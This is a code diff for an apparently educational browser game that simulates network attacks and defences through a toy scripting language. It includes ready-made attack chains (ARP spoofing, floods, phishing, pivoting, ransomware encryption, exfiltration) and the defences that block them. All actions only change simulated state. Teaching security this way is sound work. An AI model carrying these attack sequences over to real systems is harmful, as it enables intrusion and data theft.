+    case "roguedhcp": { const d=first(); if(!edReach(d))break; if(edSwitches().some(s=>s.def.has("dhcp-snooping"))) edOut("blk","[blocked] DHCP snooping dropped the rogue OFFER"); else { d.hacked=true; edOut("ok","[compromised] "+d.label+" now routes through the attacker"); } break; }
+    case "dnsspoof": { const d=first(); if(!edReach(d))break; if(edAnyDef("dnssec")) edOut("blk","[blocked] DNSSEC rejected the forged reply"); else { d.hacked=true; edOut("ok","[compromised] "+d.label+" redirected to the attacker's IP"); } break; }
+    case "flood": { const d=first(); if(!edReach(d))break; const type=(kv.type||"http").toLowerCase(); let blk="";
+      if(type==="syn"&&d.def.has("syn-cookies")) blk="SYN cookies";
+      else if(type==="icmp"&&(d.def.has("firewall-icmp")||edFwDef("firewall-icmp"))) blk="ICMP rate-limit";
+      else if((type==="http"||type==="slow")&&(d.def.has("rate-limit")||edFwDef("rate-limit"))) blk="rate-limit / scrubbing";
+      else if(type==="dns"&&(edAnyDef("bcp38")||edAnyDef("rate-limit"))) blk="source filtering (BCP38)";
+      else if(type==="discover"&&edSwitches().some(s=>s.def.has("dhcp-snooping"))) blk="DHCP snooping";
+      if(blk) edOut("blk","[blocked] "+type+" flood absorbed by "+blk); else edOut("ok","[compromised] "+d.label+" overwhelmed by "+type+" flood"); break; }
+    case "connect": { const d=first(); if(!edReach(d))break; const port=kv.port||""; if(port&&d.def.has("block:"+port)) edOut("blk","[blocked] firewall blocked port "+port); else edOut("ok","[ok] connected to "+d.label+(port?(":"+port):"")); break; }
+    case "login": { const d=first(); if(!edReach(d))break; if(d.def.has("mfa")) edOut("blk","[blocked] MFA required — a password alone is not enough"); else if(d.def.has("lockout")) edOut("blk","[blocked] account locked after repeated failures"); else { d.hacked=true; edOut("ok","[compromised] login success on "+d.label+" ("+(kv.user||"?")+")"); } break; }
+    case "inject": { const d=first(); if(!edReach(d))break; if(d.def.has("param")||d.def.has("waf")) edOut("blk","[blocked] parameterized query / WAF — input treated as data"); else { d.hacked=true; const db=sbDevices.find(x=>/data|db/i.test(x.label)); if(db)db.hacked=true; edOut("ok","[compromised] SQL injection on "+d.label+" — database dumped"); } break; }
+    case "xss": { const d=first(); if(!edReach(d))break; if(d.def.has("sanitize")||d.def.has("csp")) edOut("blk","[blocked] output encoded / CSP — the script is shown as text"); else { d.hacked=true; edOut("ok","[compromised] XSS ran in "+d.label+" — session cookie stolen"); } break; }
+    case "phish": { const d=first(); if(!edReach(d))break; if(edAnyDef("mail-filter")) { edOut("blk","[blocked] mail gateway quarantined the lure"); break; } d.hacked=true; const pc=sbDevices.find(x=>x.kind==="pc"); if(pc){ if(pc.def.has("edr")) edOut("blk","[blocked] EDR stopped the payload on "+pc.label); else { pc.hacked=true; edOut("ok","[compromised] "+d.label+" clicked — foothold on "+pc.label); } } else edOut("ok","[compromised] "+d.label+" was phished"); break; }
+    case "pivot": { const src=edFind('"'+((kv._from||kv.from)||"")+'"'), dst=edFind('"'+((kv._to||kv.to)||"")+'"'); if(!src||!dst){ edOut("err","pivot needs from=<host> to=<host>"); break; } if(!src.hacked){ edOut("err","pivot source "+src.label+" is not compromised yet"); break; } if(edAnyDef("segmentation")) edOut("blk","[blocked] network segmentation denied the pivot"); else { dst.hacked=true; edLastPath=sbBFS(src.id,dst.id)||edLastPath; edOut("ok","[compromised] pivoted "+src.label+" → "+dst.label); } break; }
+    case "infect": { const d=first(); if(!edReach(d))break; if(d.def.has("edr")||edAnyDef("edr")) edOut("blk","[blocked] EDR killed the malware"); else { d.hacked=true; edOut("ok","[compromised] malware running on "+d.label); } break; }
+    case "encrypt": { const d=first(); if(!edReach(d))break; if(d.def.has("edr")||edAnyDef("edr")) edOut("blk","[blocked] EDR stopped the mass encryption"); else if(edAnyDef("backup")){ d.hacked=true; edOut("blk","[contained] files encrypted but restorable from an offline backup"); } else { d.hacked=true; edOut("ok","[compromised] "+d.label+" encrypted — ransom demanded"); } break; }
+    case "exfil": { const d=first(); if(!d.hacked){ edOut("err","cannot exfil — "+d.label+" is not compromised"); break; } if(edReach(d)) edOut("ok","[exfil] stole data from "+d.label); break; }
+    case "defense": case "require": { let name=unq(tk[1]||""); const alias={scrubbing:"rate-limit"}; name=(alias[name.toLowerCase()]||name).toLowerCase(); const tgt= kv._on? edFind('"'+kv._on+'"') : sbDev(edHost); if(!tgt){ edOut("err","no target for defense (use: defense "+name+" on <device>)"); break; } tgt.def.add(name); edOut("ok","[defense] "+name+" enabled on "+tgt.label); break; }
+    case "firewall": { const host=sbDev(edHost); if(!host){edOut("err","no host");break;} const a0=args[0]?unq(args[0]).toLowerCase():""; if(kv.type==="icmp"||a0==="icmp"){ host.def.add("firewall-icmp"); edOut("ok","[defense] ICMP rate-limit on "+host.label); } else if(kv.port){ host.def.add("block:"+kv.port); edOut("ok","[defense] blocked port "+kv.port+" on "+host.label); } else edOut("err","firewall: use  drop type=icmp  or  block port=N"); break; }
+    case "ratelimit": { const host=sbDev(edHost); if(!host){edOut("err","no host");break;} host.def.add("rate-limit"); edOut("ok","[defense] rate-limit on "+host.label); break; }
+    default: edOut("err","unknown command: "+verb);
+  }
+}
+function edRun(){ if(edHost==null){ edOut("err","no host selected"); return; } edClear(); edVars={}; edLastPath=null;
+  const lines=document.getElementById("edCode").value.split("\n"); let n=0;
+  for(let i=0;i<lines.length;i++){ const line=lines[i].trim(); if(!line||line[0]==="#") continue; n++;
+    try{ edExec(line); }catch(err){ edOut("err","line "+(i+1)+": "+err.message); } }
+  if(!n) edOut("info","nothing to run");
+  sbRender(); if(edLastPath) sbFly(edLastPath);
+}
+function openEditor(id, preset){ if(id==null) return; const d=sbDev(id); if(!d) return; edHost=id;
+  document.getElementById("edTitle").textContent="Code · running from "+d.label;
+  const ta=document.getElementById("edCode"); ta.value= preset!==undefined? preset : (edCodeStore[id]||"");
+  edClear(); document.getElementById("editor").style.display="flex"; setTimeout(()=>ta.focus(),30);
+}
+function closeEditor(){ if(edHost!=null) edCodeStore[edHost]=document.getElementById("edCode").value; document.getElementById("editor").style.display="none"; }
+function fillHelp(){ document.getElementById("edHelp").innerHTML=`<h4>VoidScript</h4>Runs only inside this simulation — it can't touch the page or a real network.<br><br><b style="color:var(--melon)">Attack</b><br><code>scan T</code> · <code>ping T</code><br><code>arpspoof T as G</code><br><code>macflood</code> · <code>roguedhcp T</code><br><code>dnsspoof T</code><br><code>flood T type=syn|icmp|http|slow|dns</code><br><code>connect T port=N</code><br><code>login T user=u pass=p</code><br><code>inject T</code> · <code>xss T</code><br><code>phish T</code> · <code>infect T</code><br><code>pivot from=A to=B</code> · <code>encrypt T</code><br><code>exfil T</code><br><br><b style="color:var(--teal)">Defense</b><br><code>defense dai on Switch</code><br><code>defense port-security on Switch</code><br><code>defense dhcp-snooping on Switch</code><br><code>defense syn-cookies on Server</code><br><code>defense mfa on Server</code> · <code>lockout</code><br><code>defense param on App</code> · <code>sanitize</code> · <code>csp</code><br><code>defense edr on PC</code> · <code>backup</code> · <code>segmentation</code><br><code>firewall drop type=icmp</code><br><code>firewall block port=N</code> · <code>ratelimit port=N</code><br><br><b>Variables:</b> <code>set gw = Gateway</code>, then use <code>$gw</code>.<br>Names with spaces need quotes: <code>flood "Web server" type=syn</code>.`; }
+
+// ---------- Ready-made code per scenario (VoidScript) ----------
+const CODE={
+ arp:{attack:{easy:"# Minimal man-in-the-middle\narpspoof Victim as Gateway",medium:"set gw = Gateway\narpspoof Victim as $gw\narpspoof Gateway as Victim\nexfil Victim",hard:"scan Victim\narpspoof Victim as Gateway\narpspoof Gateway as Victim\nconnect Victim port=443\nexfil Victim"},defend:{easy:"defense dai on Switch",medium:"defense dhcp-snooping on Switch\ndefense dai on Switch",hard:"defense dhcp-snooping on Switch\ndefense dai on Switch\ndefense port-security on Switch"}},
+ dhcp:{attack:{easy:"roguedhcp Client",medium:"flood DHCP type=discover count=1000\nroguedhcp Client",hard:"flood DHCP type=discover count=5000\nroguedhcp Client\nexfil Client"},defend:{easy:"defense dhcp-snooping on Switch",medium:"defense dhcp-snooping on Switch\ndefense port-security on Switch",hard:"defense dhcp-snooping on Switch\ndefense port-security on Switch\ndefense dai on Switch"}},
+ mac:{attack:{easy:"macflood",medium:"macflood\nconnect Gateway port=80",hard:"macflood\nscan Victim\nexfil Victim"},defend:{easy:"defense port-security on Switch",medium:"defense port-security on Switch\ndefense dai on Switch",hard:"defense port-security on Switch\ndefense dai on Switch\ndefense dhcp-snooping on Switch"}},
+ dns:{attack:{easy:"dnsspoof Victim",medium:"flood Victim type=dns\ndnsspoof Victim\nconnect Victim port=443",hard:"scan Victim\ndnsspoof Victim\nexfil Victim"},defend:{easy:"defense dnssec on DNS",medium:"defense dnssec on DNS\ndefense dai on Switch",hard:"defense dnssec on DNS\ndefense dai on Switch\ndefense dhcp-snooping on Switch"}},
+ syn:{attack:{easy:'flood "Web server" type=syn',medium:'set t = "Web server"\nflood $t type=syn count=5000',hard:'scan "Web server"\nflood "Web server" type=syn count=20000'},defend:{easy:'defense syn-cookies on "Web server"',medium:'defense syn-cookies on "Web server"\nratelimit port=443',hard:'defense syn-cookies on "Web server"\nratelimit port=443\nfirewall block port=23'}},
+ icmp:{attack:{easy:"flood Host type=icmp",medium:"flood Host type=icmp count=10000",hard:"scan Host\nflood Host type=icmp count=100000"},defend:{easy:"firewall drop type=icmp",medium:"firewall drop type=icmp\nratelimit port=0",hard:"firewall drop type=icmp\nfirewall block port=7"}},
+ ddos:{attack:{easy:'flood "Web server" type=http count=100000',medium:'flood "Web server" type=http count=1000000',hard:'scan "Web server"\nflood "Web server" type=http count=5000000'},defend:{easy:"ratelimit port=443",medium:"ratelimit port=443\ndefense scrubbing on Gateway",hard:"ratelimit port=443\ndefense scrubbing on Gateway\nfirewall block port=80"}},
+ ampl:{attack:{easy:"flood Victim type=dns count=100000",medium:"flood Victim type=dns count=1000000",hard:"flood Victim type=dns count=5000000"},defend:{easy:"defense bcp38 on Internet",medium:"defense bcp38 on Internet\nratelimit port=53",hard:"defense bcp38 on Internet\nratelimit port=53"}},
+ slow:{attack:{easy:'flood "Web server" type=slow',medium:'flood "Web server" type=slow count=500',hard:'flood "Web server" type=slow count=5000'},defend:{easy:"ratelimit port=443",medium:"ratelimit port=443\nfirewall block port=80",hard:"ratelimit port=443"}},
+ brute:{attack:{easy:'login "Login server" user=admin pass=123456',medium:'set u = admin\nlogin "Login server" user=$u pass=password\nlogin "Login server" user=$u pass=qwerty',hard:'flood "Login server" type=http\nlogin "Login server" user=admin pass=P@ssw0rd\nexfil "Login server"'},defend:{easy:'defense lockout on "Login server"',medium:'defense lockout on "Login server"\ndefense mfa on "Login server"',hard:'defense lockout on "Login server"\ndefense mfa on "Login server"\nratelimit port=443'}},
+ phishing:{attack:{easy:"phish Employee",medium:'phish Employee\npivot from "Employee PC" to "Internal server"',hard:'phish Employee\nconnect "Internal server" port=445\npivot from "Employee PC" to "Internal server"\nexfil "Internal server"'},defend:{easy:"defense mail-filter on Firewall",medium:'defense mail-filter on Firewall\ndefense edr on "Employee PC"',hard:'defense mail-filter on Firewall\ndefense edr on "Employee PC"\ndefense segmentation on Firewall'}},
+ sqli:{attack:{easy:'inject "Web app"',medium:'inject "Web app"\nexfil Database',hard:'scan "Web app"\ninject "Web app"\nexfil Database'},defend:{easy:'defense param on "Web app"',medium:'defense param on "Web app"\ndefense waf on "Web app"',hard:'defense param on "Web app"\ndefense waf on "Web app"'}},
+ xss:{attack:{easy:"xss Victim",medium:"xss Victim\nexfil Victim",hard:"xss Victim\nexfil Victim"},defend:{easy:'defense sanitize on "Forum server"',medium:'defense sanitize on "Forum server"\ndefense csp on "Forum server"',hard:'defense sanitize on "Forum server"\ndefense csp on "Forum server"'}},
+ ransom:{attack:{easy:'infect "Employee PC"',medium:'infect "Employee PC"\nencrypt "File server"',hard:'infect "Employee PC"\npivot from "Employee PC" to "File server"\nencrypt "File server"'},defend:{easy:'defense edr on "Employee PC"',medium:'defense edr on "Employee PC"\ndefense backup on "File server"',hard:'defense edr on "Employee PC"\ndefense backup on "File server"\ndefense segmentation on Switch'}},
+};
+let codeSel={mode:"attack",level:"easy"};
+function renderCodePanel(){ const card=document.getElementById("codeCard"); if(!card) return; const C=(typeof CODE!=="undefined")?CODE[cur]:null; if(!C){ card.style.display="none"; return; } card.style.display="";
+  document.querySelectorAll("#codeCard [data-cm]").forEach(b=>b.classList.toggle("on",b.dataset.cm===codeSel.mode));
+  document.querySelectorAll("#codeCard [data-lv]").forEach(b=>b.classList.toggle("on",b.dataset.lv===codeSel.level));
+  document.getElementById("codeView").textContent=C[codeSel.mode][codeSel.level]; }
+function sbFromScenario(key){ sbSimStop(); sbDevices=[]; sbLinks=[]; sbCounter=0; sbSel=null; sbLinkFrom=null; sbPktFrom=null; const S=SCENARIOS[key]; const map={};
+  for(const nid in S.nodes){ const n=S.nodes[nid]; const d={id:++sbCounter,kind:n.kind,x:n.x,y:n.y,label:n.label,sub:n.sub,def:new Set(),hacked:false}; sbDevices.push(d); map[nid]=d.id; }
+  for(const [a,b] of S.links) sbLinks.push([map[a],map[b]]); return map; }
+function openInSandbox(key, m, lv){ const map=sbFromScenario(key); mode="sandbox"; simFrom="menu"; setBack();
+  show("libScenario",false); show("sbTitle",true); show("libControls",false); show("sbToolbar",true); show("libSide",false); show("sbSide",true);
+  buildPalette(); sbReady=true; sbRender();
+  const host = m==="attack" ? (map.attacker||map.botnet||Object.values(map)[0]) : (map.switch||map.firewall||map.gateway||map.server||map.web||map.db||map.resolver||map.dns||map.dhcp||map.bank||Object.values(map)[0]);
+  openEditor(host, CODE[key][m][lv]); }
+
+fillHelp();
+document.getElementById("edRunBtn").onclick=edRun;
+document.getElementById("edReset").onclick=edResetState;
+document.getElementById("edClearBtn").onclick=edClear;
+document.getElementById("edClose").onclick=closeEditor;
+document.getElementById("editor").addEventListener("mousedown",e=>{ if(e.target.id==="editor") closeEditor(); });
+document.querySelectorAll("#codeCard [data-cm]").forEach(b=>b.onclick=()=>{ codeSel.mode=b.dataset.cm; renderCodePanel(); });
+document.querySelectorAll("#codeCard [data-lv]").forEach(b=>b.onclick=()=>{ codeSel.level=b.dataset.lv; renderCodePanel(); });
+document.getElementById("codeCopy").onclick=()=>{ const C=CODE[cur]; if(!C)return; const t=C[codeSel.mode][codeSel.level]; try{navigator.clipboard.writeText(t);}catch(e){} toast("Code copied"); };
+document.getElementById("codeOpen").onclick=()=>{ if(CODE[cur]) openInSandbox(cur, codeSel.mode, codeSel.level); };
+
+buildMenu(); buildHero();
+</script>
+<script>
+(function(){
+  const API = "";
+  let me = null;
+
+  async function api(path, opt){
+    opt = opt || {};
+    const method = opt.method || "GET";
+    const h = {};
+    if (method !== "GET") h["X-CSRF"] = "1";
+    const init = { method, credentials: "include", headers: h };
+    if (opt.body != null) { h["Content-Type"] = "application/json"; init.body = JSON.stringify(opt.body); }
+    const r = await fetch(API + path, init);
+    if (!r.ok) { let m; try { m = (await r.json()).error; } catch(e){} throw new Error(m || ("HTTP " + r.status)); }
+    if (r.status === 204) return null;
+    try { return await r.json(); } catch(e){ return null; }
+  }
+
+  const bar = document.createElement("div");
+  bar.id = "acctBar";
+  bar.style.cssText = "position:fixed;top:10px;right:14px;z-index:70;display:flex;gap:8px;align-items:center;font-family:var(--sans)";
+  document.body.appendChild(bar);
+
+  function btn(label, fn, cls){
+    const b = document.createElement("button");
+    b.textContent = label; b.className = "ctl" + (cls ? " " + cls : "");
+    b.style.fontSize = "13px"; b.onclick = fn; return b;
+  }
+
+  function renderAccount(){
+    bar.innerHTML = "";
+    if (me) {
+      const chip = document.createElement("span");
+      chip.textContent = "@" + me.username;
+      chip.style.cssText = "font-family:var(--mono);font-size:12.5px;color:var(--stone);background:var(--night);border:1px solid var(--dusk);border-radius:9px;padding:7px 11px";
+      bar.appendChild(chip);
+      if (me.role === "moderator" || me.role === "admin") bar.appendChild(btn("Moderation", openModeration));
+      bar.appendChild(btn("Logout", doLogout));
+    } else {
+      bar.appendChild(btn("Sign in with GitHub", function(){ location.href = API + "/auth/github"; }, "primary"));
+    }
+  }
+  async function refreshMe(){ try { me = await api("/me"); } catch(e){ me = null; } renderAccount(); }
+  async function doLogout(){ try { await api("/auth/logout", { method:"POST" }); } catch(e){} me = null; renderAccount(); toast("Signed out"); }
+  function requireLogin(){ if (!me){ toast("Sign in with GitHub first"); return false; } return true; }
+
+  function currentData(){
+    return {
+      devices: sbDevices.map(function(d){ return { id:d.id, kind:d.kind, x:Math.round(d.x), y:Math.round(d.y), label:d.label, sub:d.sub }; }),
+      links: sbLinks.map(function(l){ return [l[0], l[1]]; }),
+      code: (typeof edCodeStore !== "undefined" && edCodeStore) ? edCodeStore : {}
+    };
+  }
+  function loadData(data){
+    sbDevices = (data.devices||[]).map(function(d){ return { id:d.id, kind:d.kind, x:d.x, y:d.y, label:d.label, sub:d.sub, def:new Set(), hacked:false }; });
+    sbLinks = (data.links||[]).map(function(l){ return [l[0], l[1]]; });
+    sbCounter = sbDevices.reduce(function(m,d){ return Math.max(m,d.id); }, 0);
+    edCodeStore = data.code || {};
+    sbReady = true; simFrom = "menu";
+    if (typeof setBack === "function") setBack();
+    showScreen("sim"); setMode("sandbox");
+  }
+
+  async function saveLayout(){
+    if (!requireLogin()) return;
+    const name = prompt("Name this layout:", "My network");
+    if (!name) return;
+    try { await api("/layouts", { method:"POST", body:{ name:name, data: currentData() } }); toast("Saved to your account"); }
+    catch(e){ toast("Save failed: " + e.message); }
+  }
+  async function myLayouts(){
+    if (!requireLogin()) return;
+    let res; try { res = await api("/layouts"); } catch(e){ toast("Load failed: " + e.message); return; }
+    const items = res.layouts || [];
+    openList("My layouts", items.map(function(it){ return {
+      title: it.name, sub: new Date(it.updated_at).toLocaleString(),
+      onOpen: async function(){ const full = await api("/layouts/" + it.id); loadData(full.data); closeModal(); toast("Loaded: " + it.name); }
+    }; }), items.length ? "" : "No saved layouts yet. Build a network, then press Save.");
+  }
+  async function publishLayout(){
+    if (!requireLogin()) return;
+    const title = prompt("Title for the community:"); if (!title) return;
+    const description = prompt("Short description (optional):", "") || "";
+    const category = (prompt("Category: spoof / dos / cred / web / social / malware / other", "other") || "other").toLowerCase();
+    try { await api("/publish", { method:"POST", body:{ title:title, description:description, category:category, data: currentData() } }); toast("Submitted for moderation"); }
+    catch(e){ toast("Publish failed: " + e.message); }
+  }
+
+  function injectToolbar(){
+    const tb = document.getElementById("sbToolbar");
+    if (!tb || tb.querySelector("#sbSave")) return;
+    const sep = document.createElement("div"); sep.className = "sep"; tb.appendChild(sep);
+    const s = btn("💾 Save", saveLayout); s.id = "sbSave"; tb.appendChild(s);
+    tb.appendChild(btn("📂 My layouts", myLayouts));
+    tb.appendChild(btn("⬆ Publish", publishLayout));
+  }
+
+  function ensureModal(){
+    let m = document.getElementById("pcModal");
+    if (m) return m;
+    m = document.createElement("div"); m.id = "pcModal"; m.className = "modal"; m.style.display = "none";
+    m.innerHTML = '<div class="modal-box" style="max-width:720px"><div class="modal-head"><b id="pcModalTitle"></b><button id="pcModalX">✕</button></div><div id="pcModalBody" style="padding:16px;overflow:auto"></div></div>';
+    document.body.appendChild(m);
+    m.addEventListener("mousedown", function(e){ if (e.target.id === "pcModal") closeModal(); });
+    m.querySelector("#pcModalX").onclick = closeModal;
+    return m;
+  }
+  function closeModal(){ const m = document.getElementById("pcModal"); if (m) m.style.display = "none"; }
+  function openList(title, rows, emptyMsg){
+    const m = ensureModal();
+    m.querySelector("#pcModalTitle").textContent = title;
+    const body = m.querySelector("#pcModalBody");
+    if (!rows.length) { body.innerHTML = '<div class="empty">' + (emptyMsg||"Nothing here.") + '</div>'; }
+    else {
+      body.innerHTML = "";
+      rows.forEach(function(r){
+        const card = document.createElement("div");
+        card.className = "card panel"; card.style.cssText = "margin-bottom:10px;cursor:pointer";
+        card.innerHTML = '<div style="font-weight:600">' + esc(r.title) + '</div>' + (r.sub ? '<div style="font-size:12px;color:var(--cocoa)">' + esc(r.sub) + '</div>' : '') + (r.desc ? '<div style="font-size:13px;color:#cfc9dd;margin-top:4px">' + esc(r.desc) + '</div>' : '');
+        card.onclick = r.onOpen;
+        body.appendChild(card);
+      });
+    }
+    m.style.display = "flex";
+  }
+
+  async function openCommunity(){
+    let res; try { res = await api("/community"); } catch(e){ toast("Community unavailable: " + e.message); return; }
+    const items = res.items || [];
+    openList("Community", items.map(function(it){ return {
+      title: it.title, sub: "@" + it.username + "  ♥ " + it.likes + "  · " + it.category,
+      desc: it.description,
+      onOpen: async function(){ const full = await api("/community/" + it.id); loadData(full.data); closeModal(); toast("Loaded: " + it.title); }
+    }; }), items.length ? "" : "No published layouts yet — publish one from the Sandbox.");
+  }
+
+  async function openModeration(){
+    let res; try { res = await api("/moderation/queue"); } catch(e){ toast("Queue unavailable: " + e.message); return; }
+    const items = res.items || [];
+    const m = ensureModal();
+    m.querySelector("#pcModalTitle").textContent = "Moderation queue";
+    const body = m.querySelector("#pcModalBody");
+    if (!items.length) { body.innerHTML = '<div class="empty">Nothing pending.</div>'; m.style.display = "flex"; return; }
+    body.innerHTML = "";
+    items.forEach(function(it){
+      const card = document.createElement("div"); card.className = "card panel"; card.style.marginBottom = "10px";
+      card.innerHTML = '<div style="font-weight:600">' + esc(it.title) + '</div><div style="font-size:12px;color:var(--cocoa)">@' + esc(it.username) + ' · ' + esc(it.category||"") + ' · reports: ' + it.report_count + '</div>' + (it.description ? '<div style="font-size:13px;color:#cfc9dd;margin:4px 0">' + esc(it.description) + '</div>' : '');
+      const rowel = document.createElement("div"); rowel.style.cssText = "display:flex;gap:8px;margin-top:8px";
+      rowel.appendChild(btn("Preview", async function(){ const full = await api("/moderation/" + it.id); loadData(full.data); closeModal(); }));
+      rowel.appendChild(btn("Approve", async function(){ try { await api("/moderation/" + it.id + "/approve", { method:"POST" }); card.remove(); toast("Approved"); } catch(e){ toast(e.message); } }, "primary"));
+      rowel.appendChild(btn("Reject", async function(){ const reason = prompt("Reason:", "") || ""; try { await api("/moderation/" + it.id + "/reject", { method:"POST", body:{ reason:reason } }); card.remove(); toast("Rejected"); } catch(e){ toast(e.message); } }));
+      card.appendChild(rowel); body.appendChild(card);
+    });
+    m.style.display = "flex";
+  }
+
+  function wireCommunityMenu(){
+    document.querySelectorAll("#nav button").forEach(function(b){
+      const t = b.querySelector("b");
+      if (t && t.textContent.trim() === "Community") {
+        b.classList.remove("soon");
+        const badge = b.querySelector(".badge"); if (badge) badge.remove();
+        b.onclick = openCommunity;
+      }
+    });
+  }
+
+  function init(){
+    injectToolbar();
+    wireCommunityMenu();
+    refreshMe();
+  }
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
+  else init();
+})();
+
+</script>
+<script>
+(function(){
+  var bar=document.getElementById('acctBar'); if(!bar) return;
+  bar.style.zIndex='55';
+  function place(name){
+    var hdr = name==='sim' ? document.querySelector('#sim header') : name==='gallery' ? document.querySelector('#gallery header') : null;
+    if(hdr){ bar.style.position='static'; bar.style.top=''; bar.style.right=''; bar.style.marginLeft='10px'; hdr.appendChild(bar); }
+    else { document.body.appendChild(bar); bar.style.position='fixed'; bar.style.top='14px'; bar.style.right='16px'; bar.style.marginLeft=''; }
+  }
+  if (typeof window.showScreen === 'function'){
+    var _ss = window.showScreen;
+    window.showScreen = function(n){ _ss(n); try{ place(n); }catch(e){} };
+  }
+  // place for the current screen on load
+  var cur = document.getElementById('sim').classList.contains('active') ? 'sim'
+          : document.getElementById('gallery').classList.contains('active') ? 'gallery' : 'menu';
+  place(cur);
+})();
+</script>
+<!-- ===== Portcull FX: screen transitions + menu web background ===== -->
+<style>
+  @keyframes pcScreenIn { from{opacity:0; transform:translateY(14px) scale(.992); filter:blur(3px)} to{opacity:1; transform:none; filter:none} }
+  @keyframes pcRise     { from{opacity:0; transform:translateY(12px)} to{opacity:1; transform:none} }
+  @keyframes pcFade     { from{opacity:0} to{opacity:1} }
+  @keyframes pcPop      { from{opacity:0; transform:translateY(10px) scale(.965)} to{opacity:1; transform:none} }
+
+  .screen.active{ animation:pcScreenIn .5s cubic-bezier(.2,.8,.2,1) }
+  .pc-stagger{ animation:pcRise .48s cubic-bezier(.2,.8,.2,1) backwards }
+  .modal{ animation:pcFade .2s ease-out }
+  .modal > .modal-box{ animation:pcPop .32s cubic-bezier(.2,.9,.25,1.05) }
+  #libSide, #sbSide, #sbToolbar, #libControls{ animation:pcFade .35s ease-out }
+
+  #menu{ position:relative }
+  #menu > .wrap{ position:relative; z-index:1 }
+  #pcWeb{ position:fixed; inset:0; width:100vw; height:100vh; z-index:0; pointer-events:none; display:block }
+
+  @media (prefers-reduced-motion: reduce){
+    .screen.active, .pc-stagger, .modal, .modal > .modal-box,
+    #libSide, #sbSide, #sbToolbar, #libControls{ animation:none !important }
+  }
+</style>
+<script>
+(function(){
+  const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+  /* ---------- staggered entrance for menu items & gallery cards ---------- */
+  function stagger(sel, step){
+    document.querySelectorAll(sel).forEach(function(el, i){
+      el.classList.remove("pc-stagger"); void el.offsetWidth;          // restart
+      el.style.animationDelay = (90 + i * step) + "ms";
+      el.classList.add("pc-stagger");
+    });
+  }
+  function animateScreen(name){
+    if (reduce) return;
+    if (name === "menu")    { stagger("#menu .hero-title, #menu .hero-sub", 70); stagger("#nav button", 55); }
+    if (name === "gallery") { requestAnimationFrame(function(){ stagger("#galGrid .gal-card", 35); }); }
+  }
+  const prevShow = window.showScreen;
+  window.showScreen = function(name){ const r = prevShow.apply(this, arguments); animateScreen(name); webActive = (name === "menu"); if (webActive) kick(); return r; };
+  // re-stagger when the gallery filter/search rebuilds the grid
+  const prevBuild = window.buildGallery;
+  if (typeof prevBuild === "function") window.buildGallery = function(){ const r = prevBuild.apply(this, arguments); if (!reduce) stagger("#galGrid .gal-card", 25); return r; };
+
+  /* ---------- the web: milky, distant, spring-loaded strands ---------- */
+  const menu = document.getElementById("menu");
+  const cv = document.createElement("canvas"); cv.id = "pcWeb"; cv.setAttribute("aria-hidden", "true");
+  menu.insertBefore(cv, menu.firstChild);
+  const ctx = cv.getContext("2d");
+
+  let W = 0, H = 0, DPR = 1, nodes = [], links = [];
+  let stars = [], meteors = [], wakes = [], nextMeteor = 90;
+  const METEOR_COLORS = [["155,108,255","45,212,191"], ["45,212,191","155,108,255"], ["255,140,190","155,108,255"]];
+  const mouse = { x: -9999, y: -9999, vx: 0, vy: 0, on: false };
+  let webActive = menu.classList.contains("active"), raf = 0, t = 0;
+
+  const MILK = "240,233,220";           // milky white
+  const BASE_A = 0.075;                 // how faint strands are at rest ("far away")
+  const REACH = 170;                    // mouse influence radius
+
+  function build(){
+    DPR = Math.min(window.devicePixelRatio || 1, 2);
+    W = innerWidth; H = innerHeight;
+    cv.width = W * DPR; cv.height = H * DPR; ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
+
+    // starfield: three depth layers
+    stars = [];
+    const count = Math.round(W * H / 5200);
+    for (let i = 0; i < count; i++){
+      const z = Math.random();                                   // 0 = far, 1 = near
+      stars.push({ x: Math.random() * W, y: Math.random() * H, z: z,
+        r: .35 + z * z * 1.25, a: .25 + z * .55, tw: .6 + Math.random() * 2.2, ph: Math.random() * 6.283,
+        tint: Math.random() < .12 ? (Math.random() < .5 ? "200,180,255" : "180,240,235") : "255,250,240" });
+    }
+    // jittered grid -> organic web; density scales with screen size
+    const gap = Math.max(78, Math.min(118, Math.sqrt(W * H / 120)));
+    const cols = Math.ceil(W / gap) + 2, rows = Math.ceil(H / gap) + 2;
+    nodes = []; links = [];
+    for (let r = 0; r < rows; r++) for (let c = 0; c < cols; c++){
+      const hx = (c - 1) * gap + (Math.random() - .5) * gap * .7 + (r % 2 ? gap / 2 : 0);
+      const hy = (r - 1) * gap + (Math.random() - .5) * gap * .7;
+      nodes.push({ hx, hy, x: hx, y: hy, vx: 0, vy: 0, ph: Math.random() * 6.283, glow: 0, depth: .55 + Math.random() * .45 });
+    }
+    // connect each node to its nearest neighbours (no duplicates)
+    const seen = new Set(), maxD = gap * 1.45;
+    nodes.forEach(function(a, i){
+      const near = [];
+      nodes.forEach(function(b, j){ if (i === j) return; const d = Math.hypot(a.hx - b.hx, a.hy - b.hy); if (d < maxD) near.push([d, j]); });
+      near.sort(function(p, q){ return p[0] - q[0]; });
+      near.slice(0, 3 + (Math.random() < .35 ? 1 : 0)).forEach(function(p){
+        const j = p[1], key = i < j ? i + "-" + j : j + "-" + i;
+        if (seen.has(key)) return; seen.add(key);
+        links.push({ a: i, b: j, sag: (Math.random() - .5) * 14, ph: Math.random() * 6.283 });
+      });
+    });
+  }
+
+  function step(){
+    t += 1;
+    const m = mouse;
+    for (const n of nodes){
+      // slow breathing drift around home
+      const tx = n.hx + Math.sin(t * .004 + n.ph) * 5 * n.depth;
+      const ty = n.hy + Math.cos(t * .0033 + n.ph) * 5 * n.depth;
+      // spring back home
+      n.vx += (tx - n.x) * .018; n.vy += (ty - n.y) * .018;
+      // mouse pushes strands aside, and drags them a little along its motion
+      if (m.on){
+        const dx = n.x - m.x, dy = n.y - m.y, d = Math.hypot(dx, dy);
+        if (d < REACH && d > .01){
+          const f = (1 - d / REACH);
+          n.vx += (dx / d) * f * f * 2.4 * n.depth + m.vx * f * .045;
+          n.vy += (dy / d) * f * f * 2.4 * n.depth + m.vy * f * .045;
+          n.glow = Math.max(n.glow, f);
+        }
+      }
+      n.vx *= .86; n.vy *= .86;
+      n.x += n.vx; n.y += n.vy;
+      n.glow *= .955;
+    }
+    m.vx *= .8; m.vy *= .8;
+
+    // shooting stars
+    if (--nextMeteor <= 0){ spawnMeteor(); nextMeteor = 140 + Math.random() * 260; if (Math.random() < .18) nextMeteor = 25; }
